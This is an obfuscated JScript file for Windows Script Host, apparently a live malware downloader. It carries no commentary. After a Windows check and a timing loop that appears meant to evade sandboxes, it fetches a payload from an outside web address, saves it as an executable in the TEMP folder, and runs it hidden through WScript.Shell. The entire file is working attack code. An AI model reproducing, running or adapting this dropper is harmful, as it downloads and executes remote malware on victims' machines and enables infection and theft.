var _J = false;
var _RQ = "CreateObject";
var _E0 = function _G() {return WScript[_RQ]("WScript"+".Shell");}(), _W0 = 11;
var _SA = "MSXML2.XMLHTTP";
var _MB = 2123213;
var _H = 0;
function _D(_H0){_E0["Run"](_H0, _H, _H);};
function _VW(){return _SA + "";};
function _IX(_CK, _FB){_H = _H * 1; return _CK - _FB;};
function _YY(){return _RQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _J = true;
  @end
@*/
if (_J)
{
var _T = "";
function _R(){return 22;};
var _OL = 0; var _M1 = 0;
function _EE()
{
var _M0 = new this["Date"]();
var _S = _M0["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _M0 = new this["Date"]();
var _XS = _M0["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _M0 = new this["Date"]();
var _V = _M0["getUTCMilliseconds"]();
var _OL = "_L";
_OL = _IX(_XS, _S);
var _M1 = "_XX";
_M1 = _IX(_V, _XS);
_T = "open";
return _IX(_OL, _M1);
}
var _A0 = false;
var _U0 = false;
for (var _M = _H; _M < _R() * 1; _M++){if (_EE() != _H){
_A0 = true; 
_M1 = "31" + 11 * _OL + _M1; 
_U0 = true; 
break;
}}
function _N() {return ((_A0 == true) && (_A0 == _U0)) ? 1 : _H;};
if (_A0 && _N() && _U0){
function _DD() {return _E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "f2GrV3YuI.ex" + "e";};
 _K = _VW();
 _WF = WScript[_RQ](_K);
 var _A = 1;
 while (_A){
try {
	if (_A == 1)
	{
		_WF[_T]("GET", "http://rocketsrange.com/b5ksa", false);
		_WF["send"]();
		_W = "Sleep";
	}
	WScript[_W](_R() + 120); 
	if (_WF["readystate"] < 2 * 2) continue;
	_A = _H;
	function _EK(_B) {var _U = (1, 2, 3, 4, 5, _B); return _U;};
	_BM = WScript[_YY()]("ADODB.Stream");
	_K = _BM;
	_K[_T]();
	_K["type"] = _EK(1);
	_K["write"](_WF["ResponseBody"]);
	_BM["position"] = _EK(_H);
	_K["Save" + "ToFile"](_DD(), 2);
	_BM["cl"+"ose"]();
	_F = _DD();
	_D(_F);
} catch(_E){};
}
}
}

